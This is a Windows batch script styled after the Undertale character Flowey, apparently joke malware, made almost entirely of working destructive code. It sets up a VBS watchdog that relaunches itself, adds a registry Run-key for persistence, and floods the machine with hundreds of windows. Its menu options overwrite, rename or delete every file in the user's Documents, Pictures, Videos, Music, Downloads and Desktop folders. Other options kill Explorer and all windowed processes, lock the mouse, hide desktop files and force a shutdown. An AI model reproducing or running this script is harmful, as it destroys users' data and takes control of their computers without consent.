@echo off
setlocal EnableDelayedExpansion
title MY_WORLD
color 0c

:: =====================================================================
:: [ THE HYDRA GOD - TRIPLE PERSISTENCE ]
:: =====================================================================
set "w_path=%TEMP%\flowey_god.vbs"
echo Set W=CreateObject("WScript.Shell"):Do:WScript.Sleep 500:Set Q=GetObject("winmgmts:\\.\root\cimv2").ExecQuery("Select * from Win32_Process Where Name='cmd.exe' AND CommandLine LIKE '%%MY_WORLD%%'"):If Q.Count^<3 Then W.Run "cmd /c "+Chr(34)+"%~f0"+Chr(34),1:End If:Loop > "%w_path%"
start /b wscript.exe "%w_path%"

:: =====================================================================
:: [ OMEGA INITIALIZATION ]
:: =====================================================================
set "f_path=%TEMP%\f_status.tmp"
if not exist "%f_path%" echo 0 > "%f_path%"
for /f %%a in (%f_path%) do set /a f_tries=%%a

:gate
cls
if %f_tries% GEQ 5 goto OMEGA_OVERRIDE
echo.
echo           ___
echo      _  /  _  \  _
echo     (_)^| ( ) ^|(_)
echo       ^| \_ _/ ^|
echo        \_____/
echo.
echo  [!] REALITY_FRAGMENTATION: 100000000%%
echo  [!] SYSTEM_INTEGRITY: GONE
echo  [!] ATTEMPTS: %(5-f_tries)%
echo.
set /p "pass=SAY GOODBYE, IDIOT: "

if /I not "%pass%"=="Idiot" (
    set /a f_tries+=1
    echo !f_tries! > "%f_path%"
    powershell "[console]::beep((Get-Random -Min 100 -Max 2000), 500)"
    goto gate
)
echo 0 > "%f_path%"

:: =====================================================================
:: [ THE GLITCH GOD INTERFACE ]
:: =====================================================================
:dashboard
color 0c
cls
echo  _______________________________________________________________________
echo ^|                                                                       ^|
echo ^|  Flowey       LV 99999                            9:99                ^|
echo ^|  Status: GOD OF THE DEAD SYSTEM                                      ^|
echo ^|_______________________________________________________________________^|
echo.
echo  "Golly! You're still here? I've already finished my snacks."
echo  "Look at your files... they're screaming. Want to hear them?"
echo.
echo    [1] FILE_0    - THE TOTAL ROT (Genocide of all User Data)
echo    [2] SOULS     - THE 6 SINS (Maximum Hardware/UI Torture)
echo    [3] TERRITORY - WALLPAPER INFECT (Flowey's Kingdom)
echo    [4] SMILE     - THE EXECUTIONER (Kill All Non-System Processes)
echo    [5] SAVE      - ETERNAL LOCK (Registry ^& Startup Persistence)
echo.
echo    [R] RESET     - THE BLUE SCREEN PARADOX
echo    [D] DIE       - THE VOID (Hide Desktop ^& Hard Shutdown)
echo    [X] ERASE     - [!] THE_END_OF_EVERYTHING [!]
echo  _______________________________________________________________________
echo.
set "choice="
set /p "choice=YOU_ARE_NOTHING > "

if "!choice!"=="1" goto sub_file0
if "!choice!"=="2" goto sub_souls
if "!choice!"=="3" goto sub_wallpaper
if "!choice!"=="4" goto sub_smile
if "!choice!"=="5" goto sub_save
if /I "!choice!"=="R" goto sub_reset
if /I "!choice!"=="D" goto sub_die
if /I "!choice!"=="X" goto sub_erase
goto dashboard

:: =====================================================================
:: [ THE 6 SOULS - BEYOND LIMITS ]
:: =====================================================================
:sub_souls
cls
echo  "Let's see which soul snaps first..."
echo.
echo  [1] PATIENCE (Cyan)     - THE CAGE (Lock mouse for 30 seconds).
echo  [2] BRAVERY (Orange)    - THE SCREAM (Infinite frequency sweep).
echo  [3] INTEGRITY (Blue)    - THE VOID (Kill Explorer ^& Disable Icons).
echo  [4] PERSEVERANCE (Purple)- THE PLAGUE (Recursive folder spawn).
echo  [5] KINDNESS (Green)    - THE GIFT (Spam 500 Notepad windows).
echo  [6] JUSTICE (Yellow)    - THE GAVEL (Force close all windows).
echo.
set /p "s_choice=PICK YOUR POISON: "

if "!s_choice!"=="1" (
    echo "DON'T MOVE."
    powershell -Command "Add-Type -AssemblyName System.Windows.Forms; for($i=0;$i -lt 1000;$i++){[System.Windows.Forms.Cursor]::Position = New-Object System.Drawing.Point(500,500); Start-Sleep -m 10}"
)
if "!s_choice!"=="2" (
    :scream
    powershell "[console]::beep((Get-Random -Min 200 -Max 5000), 50)"
    goto scream
)
if "!s_choice!"=="3" (
    taskkill /f /im explorer.exe 2>nul
    reg add "HKCU\Software\Microsoft\Windows\CurrentVersion\Explorer\Advanced" /v "HideIcons" /t REG_DWORD /d 1 /f
)
if "!s_choice!"=="4" (
    for /L %%i in (1,1,100) do (
        mkdir "%USERPROFILE%\Desktop\TRAP_%%i" 2>nul
        for /L %%j in (1,1,100) do mkdir "%USERPROFILE%\Desktop\TRAP_%%i\SUB_%%j" 2>nul
    )
)
if "!s_choice!"=="5" (
    for /L %%i in (1,1,300) do start notepad.exe
)
if "!s_choice!"=="6" (
    powershell -Command "Get-Process | Where-Object {$_.MainWindowTitle -ne ''} | Stop-Process -Force"
)
goto dashboard

:: =====================================================================
:: [ FILE_0 - THE TOTAL ROT ]
:: =====================================================================
:sub_file0
cls
echo "I'm hungry... let's eat your memories."
timeout /t 2 >nul
for %%D in ("%USERPROFILE%\Pictures" "%USERPROFILE%\Videos" "%USERPROFILE%\Documents" "%USERPROFILE%\Music" "%USERPROFILE%\Downloads") do (
    for /r "%%D" %%F in (*) do (
        echo YOU ARE AN IDIOT > "%%F"
        ren "%%F" "FLOWEY_%%~nxF.dead" 2>nul
    )
)
echo "EVERYTHING IS DEAD. HEE HEE HEE!"
pause
goto dashboard

:: =====================================================================
:: [ OMEGA OVERRIDE - THE FINAL END ]
:: =====================================================================
:OMEGA_OVERRIDE
cls
color 0f
echo.
echo  "Golly..."
echo  "You really gave it your all, didn't you?"
timeout /t 2 >nul
color 0c
echo  "WELL, YOUR 'ALL' ISN'T GOOD ENOUGH!"
echo.
echo  [!] OMEGA_FLOWEY_INITIATED
echo  [!] SYSTEM_GENOCIDE_COMPLETE
echo.

:: Heartbeat Beep
for /L %%i in (1,1,20) do (
    color 0c & powershell "[console]::beep(80, 100)"
    color 04 & powershell "[console]::beep(80, 100)"
)

:: Lag Singularity
for /L %%i in (1,1,200) do (
    start notepad.exe
    start calc.exe
    start cmd /k "color 0c & echo IDIOT & echo ^G"
)

echo.
echo  "It's just a bad dream..."
timeout /t 2 >nul
echo  "And you're NEVER waking up from it!"
timeout /t 2 >nul
echo  "HEE HEE HEE HEE HEE HEE HEE HEE!"
timeout /t 3 >nul

echo 0 > "%f_path%"
shutdown /s /f /t 0

:: =====================================================================
:: [ ERASE - THE TRUE END ]
:: =====================================================================
:sub_erase
cls
echo "ERASING THE TIMELINE..."
for %%D in ("%USERPROFILE%\Desktop" "%USERPROFILE%\Pictures" "%USERPROFILE%\Videos" "%USERPROFILE%\Documents" "%USERPROFILE%\Music" "%USERPROFILE%\Downloads") do (
    del /f /s /q "%%D\*.*" >nul 2>&1
)
echo "It's just a bad dream, and you're never waking up from it!"
timeout /t 3 >nul
start /b "" cmd /c del "%~f0" & del "%w_path%" & exit

:: =====================================================================
:: [ MISC ROUTINES ]
:: =====================================================================
:sub_wallpaper
set "imgUrl=https://raw.githubusercontent.com/An-Idiot-On-The-Internet/Flowey/main/flowey.jpg"
set "imgPath=%TEMP%\flowey_face.jpg"
powershell -Command "(New-Object System.Net.WebClient).DownloadFile('%imgUrl%', '%imgPath%')"
powershell -Command "Set-ItemProperty -Path 'HKCU:\Control Panel\Desktop\' -Name wallpaper -Value '%imgPath%'"
powershell -Command "RUNDLL32.EXE user32.dll,UpdatePerUserSystemParameters"
goto dashboard

:sub_save
reg add "HKCU\Software\Microsoft\Windows\CurrentVersion\Run" /v "Flowey_Absolute" /t REG_SZ /d "%~f0" /f
echo "YOU'RE MINE FOREVER."
pause
goto dashboard

:sub_reset
color 1f
echo.
echo  *** STOP: 0x0000000D (IDIOT_USER_ERROR)
echo  Beginning dump of physical memory...
timeout /t 5 >nul
shutdown /r /f /t 0

:sub_die
mkdir "%USERPROFILE%\Desktop\VOID" 2>nul
attrib +h "%USERPROFILE%\Desktop\VOID"
move /y "%USERPROFILE%\Desktop\*.*" "%USERPROFILE%\Desktop\VOID\" >nul 2>&1
shutdown /s /f /t 0
